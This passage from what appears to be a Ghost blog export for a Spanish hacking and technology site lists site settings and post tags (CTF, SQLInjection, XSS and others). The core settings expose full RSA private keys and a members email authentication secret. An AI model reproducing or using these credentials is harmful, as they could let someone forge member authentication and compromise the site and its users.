            "value": "-----BEGIN RSA PRIVATE KEY-----\nMIICXQIBAAKBgQCR0yaibChT5soOSg3oNDAgHiQxW/cpapIdcWMneCSBEaGCFt+XbYMmvrvB\nGmK4kA6R9qtUQXg+CE9AJD1Cb9EKSfzN602YQEV3+qry3dtBZAHIG+usymRvQR/LmyGpn5Hi\naI04cIZ4JuHV237JQ7Tqef95kWfQts3qOkMH47gS+QIDAQABAoGAPQymNweK1p1faB4OtnDq\n2PdldZin4BnytArdVQ/SUIq+EAVddDrv1k+xsQVH4TbGMsuPLMX//hBihVrmnqLLY5u+tc0A\nxO0732VEiptmg7syCxbwEiEzi8iaRH4AqvdI7+LS4QY5E2Og/+heCzey6rg5hJm/ljC0KZzw\ncA4QixECQQDo0A1mJ3XcFWFczqREblYg/eNnnnB+XG5bFQSQMcrdAvlNnDnRHxv+hf9GDGZC\nuwd6sXY/HErcdZgFcEtgakt9AkEAoFkygPauJJ8KViDn4XlkgSrkXlt2v/S8ehaPngL6r7+5\n2UHRCHa/4mn4B7LmxWP4Xz9plLUgKrIYjWzBItlmLQJBANJhH5qOUgzdLSxGd153LlGF2/cI\nz7MAJ6Ea7xK2TBFH3KzrXbvBlvR7deCA1++5Ptr6flYtZOCvSv6vKQ4pP6kCQFQonK49Sock\nBgvQd4PK7+ovde7kOH5lWCsH/lbjn2lwyn1x4uF7Whjen3SC/EYrwydSo/qN2hUupl5L7054\nJf0CQQDWAk7ZVrUBjfeR9Qei+ZVKfB6b1rsCxOgCeKlMDme9A0zBta9cU7WUYt4KKBZwzDoM\neNtL2tpUxeA/KJFfRksl\n-----END RSA PRIVATE KEY-----\n",
            "type": "string",
            "flags": null,
            "created_at": "2022-12-20T21:04:30.000Z",
            "updated_at": "2022-12-20T21:04:30.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61ac",
            "group": "core",
            "key": "members_public_key",
            "value": "-----BEGIN RSA PUBLIC KEY-----\nMIGJAoGBAJnUcYx8OohR5l81khVu5zQAbgo8ViH1EjaDpkBk1137uCsTAfRAnWLra42zkKhu\nT775eIqSBPJg6kTAD8msY53e/Q62aK1urpPef4uUMI5zbR5zlfo9kBBfEED3fQoTW9gJcwne\nQ0YYriB5hdiOcdckzX+DU/IyWMWRl21b0zZVAgMBAAE=\n-----END RSA PUBLIC KEY-----\n",
            "type": "string",
            "flags": null,
            "created_at": "2022-12-20T21:04:30.000Z",
            "updated_at": "2022-12-20T21:04:30.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61ad",
            "group": "core",
            "key": "members_private_key",
            "value": "-----BEGIN RSA PRIVATE KEY-----\nMIICXQIBAAKBgQCZ1HGMfDqIUeZfNZIVbuc0AG4KPFYh9RI2g6ZAZNdd+7grEwH0QJ1i62uN\ns5Cobk+++XiKkgTyYOpEwA/JrGOd3v0Otmitbq6T3n+LlDCOc20ec5X6PZAQXxBA930KE1vY\nCXMJ3kNGGK4geYXYjnHXJM1/g1PyMljFkZdtW9M2VQIDAQABAoGAecfouMokYIVN9rPnWZZ5\n7P4mH25S1gE5EPU6KaJrqZi83UTn+CErOAOeGwk8DUt/UHYZSsJ8rhGxhQnztboHBdr1Yupi\nF7e11q2fKq2dasTnEW0dn2kbqB2w7WVXJ+mHD9M13gvfgKW+Zh6aYe54uotFazvmWwuEWJyX\nlGXF3oECQQDN8/YzMlHmAm1E6U4tb7o+BPJhw5MA3XYIUSLUZwlXzHlVgiay5BS+YKzWhBBg\nhA08wQ1y5/TjUVJjlLYv2bxhAkEAvzX6SC9JUBv2WKnpM2DLChIiHI2xNi3lpH/G+TT0Ju2K\nu/Ia19GVj0zijBXRJ8hVURUpaWbjSBMthjQDUHTedQJBAJkyKGeqvYrXMUp6NOHNYv7xFQ6t\nuLKDCWJkYAEY57U8buCxIHIfAGMgbFBhCgGRGHuhqoxXiCxy+FMEcoSjdOECQHFTUoUZ0X+z\nMuwVt+sFgRD08lat+8u6pBI80Pa+Vb4Ep2cA9LvYsaV+0f5op8/GQhqOSj74Bdif1SlnBlfX\nDEkCQQCIDid3U3Ey5dbABK/I7Rf9tIuphxqSDPct+KYZLV4Yi5kO8RRrcXUJZuiRB8NKxxwu\nA/MlJzuda9M5CAj9HTuB\n-----END RSA PRIVATE KEY-----\n",
            "type": "string",
            "flags": null,
            "created_at": "2022-12-20T21:04:30.000Z",
            "updated_at": "2022-12-20T21:04:30.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61ae",
            "group": "core",
            "key": "members_email_auth_secret",
            "value": "8620f5651b9b66dce7185a6dc2d0309a0622e8e27735060e37406fb953b80649d99da0a6b68dfc4def54888025cb299285963d97b442ff56d5197b9f7b70d2ed",
            "type": "string",
            "flags": null,
            "created_at": "2022-12-20T21:04:30.000Z",
            "updated_at": "2022-12-20T21:04:30.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61b1",
            "group": "site",
            "key": "title",
            "value": "ikerocio.com",
            "type": "string",
            "flags": "PUBLIC",
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:07:21.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61b2",
            "group": "site",
            "key": "description",
            "value": "Hacking, tecnología y curiosidades.",
            "type": "string",
            "flags": "PUBLIC",
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-12-31T00:11:42.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61b3",
            "group": "site",
            "key": "logo",
            "value": "__GHOST_URL__/content/images/2022/01/android-chrome-512x512.aa50b62a9167-1.png",
            "type": "string",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:10:14.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61b4",
            "group": "site",
            "key": "cover_image",
            "value": "__GHOST_URL__/content/images/2022/12/banner.png",
            "type": "string",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-12-31T00:07:46.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61b5",
            "group": "site",
            "key": "icon",
            "value": "__GHOST_URL__/content/images/2022/01/android-chrome-512x512.aa50b62a9167.png",
            "type": "string",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:10:14.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61b6",
            "group": "site",
            "key": "accent_color",
            "value": "#383838",
            "type": "string",
            "flags": "PUBLIC",
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T18:42:11.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61b7",
            "group": "site",
            "key": "locale",
            "value": "es",
            "type": "string",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:12:20.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61b8",
            "group": "site",
            "key": "timezone",
            "value": "Europe/Paris",
            "type": "string",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:12:20.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61b9",
            "group": "site",
            "key": "codeinjection_head",
            "value": "<!-- Global site tag (gtag.js) - Google Analytics -->\n<script async src=\"https://www.googletagmanager.com/gtag/js?id=G-9PPMP2LCPK\"></script>\n<script>\n  window.dataLayer = window.dataLayer || [];\n  function gtag(){dataLayer.push(arguments);}\n  gtag('js', new Date());\n\n  gtag('config', 'G-9PPMP2LCPK');\n</script>\n\n<!-- Hide subscribe button -->\n<style type=\"text/css\">\na.gh-head-button {\n    display: none\n    }\n</style>\n\n<!-- Copy button on code blocks -->\n<link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/toolbar/prism-toolbar.min.css\" />\n<style>\n    div.code-toolbar>.toolbar {\n        opacity: 1;\n        top: 0.7em\n    }\n    \n    div.code-toolbar>.toolbar>.toolbar-item {\n    \t\n    }\n    \n    .copy-to-clipboard-button>i{\n        font-size:1.7rem;\n        color: #ccc;\n    }\n    \n    .copy-to-clipboard-button>i:hover{\n        color: #fff;\n    }\n       \n    .copy-to-clipboard-button[data-copy-state=\"copy-success\"]>i {\n      color: green !important;\n    }\n    \n    .copy-to-clipboard-button[data-copy-state=\"copy-error\"]>i {\n      color: red !important;\n    }\n</style>\n\n<!-- Syntax highlight -->\n<link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css\" integrity=\"sha512-vswe+cgvic/XBoF1OcM/TeJ2FW0OofqAVdCZiEYkd6dwGXthvkSFWOoGGJgS2CW70VK5dQM5Oh+7ne47s74VTg==\" crossorigin=\"anonymous\" referrerpolicy=\"no-referrer\" />\n\n<style>\n    pre[class*=language-] {\n        background: #111;\n    }\n    \n    /* When text is selected, change background */\n    ::-moz-selection {\n        color: #fff;\n        background: #00bb0e;\n\t}\n    ::selection {\n        color: #fff;\n        background: #00bb0e;\n\t}\n</style>\n\n<!-- Custom highlighter header -->\n<link href=\"https://cdn.jsdelivr.net/npm/remixicon@2.5.0/fonts/remixicon.css\" rel=\"stylesheet\">\n<style>\n    div.code-header{\n\t    display:flex;\n\t    align-items: center;\n        justify-content: center;\n        margin-top:-10px !important;\n        margin-bottom:5px;\n    }\n</style>",
            "type": "string",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2023-01-07T17:39:40.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61ba",
            "group": "site",
            "key": "codeinjection_foot",
            "value": "<!-- Syntax highlight -->\n<script src=\"https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js\" integrity=\"sha512-9khQRAUBYEJDCDVP2yw3LRUQvjJ0Pjx0EShmaQjcHa6AXiOv6qHQu9lCAIR8O+/D8FtaCoJ2c0Tf9Xo7hYH01Q==\" crossorigin=\"anonymous\" referrerpolicy=\"no-referrer\"></script>\n<script src=\"https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js\" integrity=\"sha512-SkmBfuA2hqjzEVpmnMt/LINrjop3GKWqsuLSSB3e7iBmYK7JuWw4ldmmxwD9mdm2IRTTi0OxSAfEGvgEi0i2Kw==\" crossorigin=\"anonymous\" referrerpolicy=\"no-referrer\"></script>\n\n<!-- Copy button on code blocks -->\n<script type=\"text/javascript\" src=\"https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/toolbar/prism-toolbar.min.js\"></script>\n<script type=\"text/javascript\" src=\"https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/copy-to-clipboard/prism-copy-to-clipboard.min.js\"></script>\n\n<script src=\"https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js\"></script>\n\n<!-- Custom highlighter header -->\n<script>\n    function addLanguageHeaderToCodeSnippets(){\n        const codes = document.querySelectorAll(\"code\");\n        codes.forEach(code => {\n            const headerDiv = document.createElement(\"div\");\n            headerDiv.classList.add(\"code-header\");\n            const codeParagraph = document.createElement(\"p\");\n            const language = code.className.split('-')[1];\n            codeParagraph.innerHTML = language;\n            headerDiv.appendChild(codeParagraph);\n            code.parentNode.insertBefore(headerDiv, code);\n        });\n    }\n    \n    function replaceCopyTextByClipboardIcon(){\n        const copyButtons = document.getElementsByClassName('copy-to-clipboard-button');\n        for (let btn of copyButtons) {\n            btn.innerHTML = '<i class=\"ri-clipboard-line\"></i>';\n        }\n    }\n    \n    setTimeout(addLanguageHeaderToCodeSnippets, 50);\n    setTimeout(replaceCopyTextByClipboardIcon, 50);\n</script>",
            "type": "string",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2023-01-07T17:37:32.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61bb",
            "group": "site",
            "key": "facebook",
            "value": null,
            "type": "string",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T18:46:30.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61bc",
            "group": "site",
            "key": "twitter",
            "value": null,
            "type": "string",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T18:46:30.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61bd",
            "group": "site",
            "key": "navigation",
            "value": "[{\"label\":\"Sobre mí\",\"url\":\"https://ikerocio.com/\"},{\"label\":\"Blog\",\"url\":\"/\"}]",
            "type": "array",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-02-01T18:52:37.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61be",
            "group": "site",
            "key": "secondary_navigation",
            "value": "[]",
            "type": "array",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:09:02.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61bf",
            "group": "site",
            "key": "meta_title",
            "value": null,
            "type": "string",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:07:09.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61c0",
            "group": "site",
            "key": "meta_description",
            "value": null,
            "type": "string",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:07:09.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61c1",
            "group": "site",
            "key": "og_image",
            "value": null,
            "type": "string",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:07:09.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61c2",
            "group": "site",
            "key": "og_title",
            "value": null,
            "type": "string",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:07:09.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61c3",
            "group": "site",
            "key": "og_description",
            "value": null,
            "type": "string",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:07:09.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61c4",
            "group": "site",
            "key": "twitter_image",
            "value": null,
            "type": "string",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:07:09.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61c5",
            "group": "site",
            "key": "twitter_title",
            "value": null,
            "type": "string",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:07:09.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61c6",
            "group": "site",
            "key": "twitter_description",
            "value": null,
            "type": "string",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:07:09.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61c7",
            "group": "theme",
            "key": "active_theme",
            "value": "casper",
            "type": "string",
            "flags": "RO",
            "created_at": "2022-12-20T21:04:30.000Z",
            "updated_at": "2023-01-07T17:22:17.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61c8",
            "group": "private",
            "key": "is_private",
            "value": "false",
            "type": "boolean",
            "flags": null,
            "created_at": "2022-12-20T21:04:30.000Z",
            "updated_at": "2022-12-20T21:04:30.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61c9",
            "group": "private",
            "key": "password",
            "value": "",
            "type": "string",
            "flags": null,
            "created_at": "2022-12-20T21:04:30.000Z",
            "updated_at": "2022-12-20T21:04:30.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61ca",
            "group": "private",
            "key": "public_hash",
            "value": "2fd9cb6f4588d21dea980b2b3e0684",
            "type": "string",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:07:09.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61cb",
            "group": "members",
            "key": "default_content_visibility",
            "value": "public",
            "type": "string",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:07:09.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61cc",
            "group": "members",
            "key": "default_content_visibility_tiers",
            "value": "[]",
            "type": "array",
            "flags": null,
            "created_at": "2022-02-27T15:15:40.000Z",
            "updated_at": "2022-02-27T15:15:40.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61cd",
            "group": "members",
            "key": "members_signup_access",
            "value": "none",
            "type": "string",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T18:15:00.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61ce",
            "group": "members",
            "key": "members_support_address",
            "value": "noreply",
            "type": "string",
            "flags": "PUBLIC,RO",
            "created_at": "2022-12-20T21:04:30.000Z",
            "updated_at": "2022-12-20T21:04:30.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61d1",
            "group": "members",
            "key": "stripe_plans",
            "value": "[]",
            "type": "array",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:07:09.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61d4",
            "group": "members",
            "key": "stripe_connect_livemode",
            "value": null,
            "type": "boolean",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:07:09.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61d5",
            "group": "members",
            "key": "stripe_connect_display_name",
            "value": null,
            "type": "string",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:07:09.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61d7",
            "group": "members",
            "key": "members_monthly_price_id",
            "value": null,
            "type": "string",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:07:09.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61d8",
            "group": "members",
            "key": "members_yearly_price_id",
            "value": null,
            "type": "string",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:07:09.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61d9",
            "group": "members",
            "key": "members_track_sources",
            "value": "true",
            "type": "boolean",
            "flags": null,
            "created_at": "2022-12-20T17:49:55.000Z",
            "updated_at": null
          },
          {
            "id": "63a2235eb4a78600c3cb61da",
            "group": "portal",
            "key": "portal_name",
            "value": "true",
            "type": "boolean",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:07:09.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61db",
            "group": "portal",
            "key": "portal_button",
            "value": "true",
            "type": "boolean",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:07:09.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61dc",
            "group": "portal",
            "key": "portal_plans",
            "value": "[\"free\"]",
            "type": "array",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:07:09.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61dd",
            "group": "portal",
            "key": "portal_products",
            "value": "[]",
            "type": "array",
            "flags": null,
            "created_at": "2022-12-20T21:04:30.000Z",
            "updated_at": "2022-12-20T21:04:30.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61de",
            "group": "portal",
            "key": "portal_button_style",
            "value": "icon-and-text",
            "type": "string",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:07:09.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61df",
            "group": "portal",
            "key": "portal_button_icon",
            "value": null,
            "type": "string",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:07:09.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61e0",
            "group": "portal",
            "key": "portal_button_signup_text",
            "value": "Subscribe",
            "type": "string",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:07:09.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61e1",
            "group": "email",
            "key": "mailgun_domain",
            "value": null,
            "type": "string",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:07:09.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61e2",
            "group": "email",
            "key": "mailgun_api_key",
            "value": null,
            "type": "string",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:07:09.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61e3",
            "group": "email",
            "key": "mailgun_base_url",
            "value": null,
            "type": "string",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:07:09.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61e4",
            "group": "email",
            "key": "email_track_opens",
            "value": "true",
            "type": "boolean",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:07:09.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61e5",
            "group": "email",
            "key": "email_track_clicks",
            "value": "true",
            "type": "boolean",
            "flags": null,
            "created_at": "2022-12-20T17:49:53.000Z",
            "updated_at": null
          },
          {
            "id": "63a2235eb4a78600c3cb61e7",
            "group": "amp",
            "key": "amp",
            "value": "false",
            "type": "boolean",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:07:09.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61e8",
            "group": "amp",
            "key": "amp_gtag_id",
            "value": null,
            "type": "string",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:07:09.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61e9",
            "group": "firstpromoter",
            "key": "firstpromoter",
            "value": "false",
            "type": "boolean",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:07:09.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61ea",
            "group": "firstpromoter",
            "key": "firstpromoter_id",
            "value": null,
            "type": "string",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:07:09.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61eb",
            "group": "labs",
            "key": "labs",
            "value": "{}",
            "type": "object",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:07:09.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61ec",
            "group": "slack",
            "key": "slack_url",
            "value": "",
            "type": "string",
            "flags": null,
            "created_at": "2022-12-20T21:04:30.000Z",
            "updated_at": "2022-12-20T21:04:30.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61ed",
            "group": "slack",
            "key": "slack_username",
            "value": "Ghost",
            "type": "string",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-02-13T22:11:36.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61ee",
            "group": "unsplash",
            "key": "unsplash",
            "value": "true",
            "type": "boolean",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:07:09.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61ef",
            "group": "views",
            "key": "shared_views",
            "value": "[]",
            "type": "array",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:07:09.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61f0",
            "group": "editor",
            "key": "editor_default_email_recipients",
            "value": "disabled",
            "type": "string",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:13:24.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61f1",
            "group": "editor",
            "key": "editor_default_email_recipients_filter",
            "value": "none",
            "type": "string",
            "flags": null,
            "created_at": "2022-01-29T15:07:09.000Z",
            "updated_at": "2022-01-29T15:13:24.000Z"
          },
          {
            "id": "63a2235eb4a78600c3cb61f2",
            "group": "comments",
            "key": "comments_enabled",
            "value": "off",
            "type": "string",
            "flags": null,
            "created_at": "2022-12-20T17:49:53.000Z",
            "updated_at": null
          }
        ],
        "snippets": [],
        "stripe_prices": [],
        "stripe_products": [],
        "tags": [
          {
            "id": "63a2235ab4a78600c3cb600a",
            "name": "News",
            "slug": "news",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2022-12-20T21:04:26.000Z",
            "updated_at": "2022-12-20T21:04:26.000Z"
          },
          {
            "id": "63a223c00057530148112358",
            "name": "CTF",
            "slug": "ctf",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2022-01-29T15:23:09.000Z",
            "updated_at": "2022-01-29T15:23:09.000Z"
          },
          {
            "id": "63a223c00057530148112359",
            "name": "Pentesting",
            "slug": "pentesting",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2022-01-29T15:37:56.000Z",
            "updated_at": "2022-01-29T15:37:56.000Z"
          },
          {
            "id": "63a223c0005753014811235a",
            "name": "Hacking",
            "slug": "hacking",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2022-01-29T15:37:56.000Z",
            "updated_at": "2022-01-29T15:37:56.000Z"
          },
          {
            "id": "63a223c0005753014811235b",
            "name": "SQLInjection",
            "slug": "sqlinjection",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2022-02-01T18:51:18.000Z",
            "updated_at": "2022-02-01T18:51:18.000Z"
          },
          {
            "id": "63a223c0005753014811235c",
            "name": "RepoExample",
            "slug": "repoexample",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2022-02-01T18:51:18.000Z",
            "updated_at": "2022-02-01T18:51:18.000Z"
          },
          {
            "id": "63a223c0005753014811235d",
            "name": "Dummies",
            "slug": "dummies",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2022-02-01T18:51:18.000Z",
            "updated_at": "2022-02-01T18:51:18.000Z"
          },
          {
            "id": "63a223c0005753014811235e",
            "name": "UnrestrictedFileUpload",
            "slug": "unrestrictedfileupload",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2022-02-07T19:50:56.000Z",
            "updated_at": "2022-02-07T19:50:56.000Z"
          },
          {
            "id": "63a223c0005753014811235f",
            "name": "Vulnerabilities",
            "slug": "vulnerabilities",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2022-02-07T19:50:56.000Z",
            "updated_at": "2022-02-07T19:50:56.000Z"
          },
          {
            "id": "63a223c00057530148112360",
            "name": "XSS",
            "slug": "xss",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2022-02-08T20:22:21.000Z",
